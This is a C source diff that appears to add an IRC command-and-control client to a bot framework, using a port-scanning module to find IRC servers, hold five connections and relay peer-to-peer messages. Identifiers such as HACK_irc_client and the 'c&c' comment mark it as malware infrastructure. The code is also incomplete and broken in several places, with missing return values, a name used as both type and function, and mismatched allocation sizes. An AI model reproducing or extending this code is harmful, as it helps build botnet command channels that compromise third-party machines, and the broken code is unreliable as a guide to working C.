@@ -24,7 +24,48 @@ using it to connect to c&c
 #include "structs.h"
 #include "utils.h"
 #include "irc.h"
+#include "../modules/portscan/portscan.h"
 
+// how many times to attempt to reconnect?
+#define IRC_RETRY_TIME 60
+#define IRC_RETRY_COUNT 5
+#define IRC_CONNECTIONS 5
+#define IRC_PORTSCAN_SEED 5
+
+enum {
+    IRC_PRIVMSG,
+    IRC_CTCP,
+    IRC_MOTD,
+    
+};
+
+
+typedef struct _irc_custom {
+    // irc parameters required for connecting
+    char nickname[32];
+    char username[16];
+    char real_name[64];
+    
+    // how many times have we attempted to connect to
+    // this server again?
+    int retry_ts;
+    int retry_count;
+} IRCCustom;
+
+
+
+IRCCustom *IRCVars(Connection *cptr) {
+    if (cptr->buf == NULL) {
+        cptr->buf = (char *)malloc(sizeof(BotVariables) + 1);
+        
+        if (cptr->buf == NULL)
+            return NULL;
+        
+        memset(cptr->buf, 0, sizeof(BotVariables));
+    }
+    
+   return (IRCCustom *)cptr->buf;
+}
 
 
 IRC_Client_Connection *irc_client_list = NULL;
@@ -59,17 +100,65 @@ ModuleFuncs irc_client_funcs = {
 };
 
 
+// begin scanning for IRC networks..
+// reseed the scanner so it starts again
+// maybe keep statistics later to skip some..  not sure how to do this yet
+int irc_scan() {
+    // seed the portscan
+    Portscan_Seed(HACK_irc_client.listen_port, IRC_PORTSCAN_SEED);
+    // enable it
+    Portscan_Enable(HACK_irc_client.listen_port);
+}
+
+// initializes the module by adding itself to the port scan
+int irc_module_init(Modules **module_list) {
+    // prepare port scanning for irc servers..
+    Portscan_Add(&HACK_irc_client, HACK_irc_client.listen_port);
+    irc_scan();    
+}
+
 
 // we must ensure connectivity, ping/pong, and determine whther any messages are in queue for distribution
 // from p2p
 int irc_client_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
+
+    // if we are low on connections.. re-enable the port scan
+    // maybe some servers went down?
+    if (irc_count() < IRC_CONNECTIONS) {
+        irc_scan();
+    }  
+}
+
+int irc_count(Modules *mptr) {
+    int count = 0;
+    Connection *cptr = mptr->connections;
     
+    while (cptr != NULL) {
+        if (stateOK(cptr))
+            count++;
+            
+        cptr = cptr->next;
+    }
+    
+    return count;
+}
+
+int irc_client_init(Modules *mptr, Connection *cptr) {
+    IRCVars *irccustom = (IRCVars *)IRCVars(cptr);
+    
+    // we need to generate nicknames, etc
 }
 
 // on connect we must generate nickname, user id, and real name
 // and push to the server
 int irc_client_connected(Modules *mptr, Connection *cptr, char *buf, int size) {
+    if (irc_count() > IRC_CONNECTIONS) {
+        // disable port scanning if we have connected to five irc servers
+        Portscan_Disable(HACK_irc_client.listen_port);
+    }
     
+    // send initialization information for the new irc server we connected to
+    irc_client_init(mptr, cptr);
 }
 
 
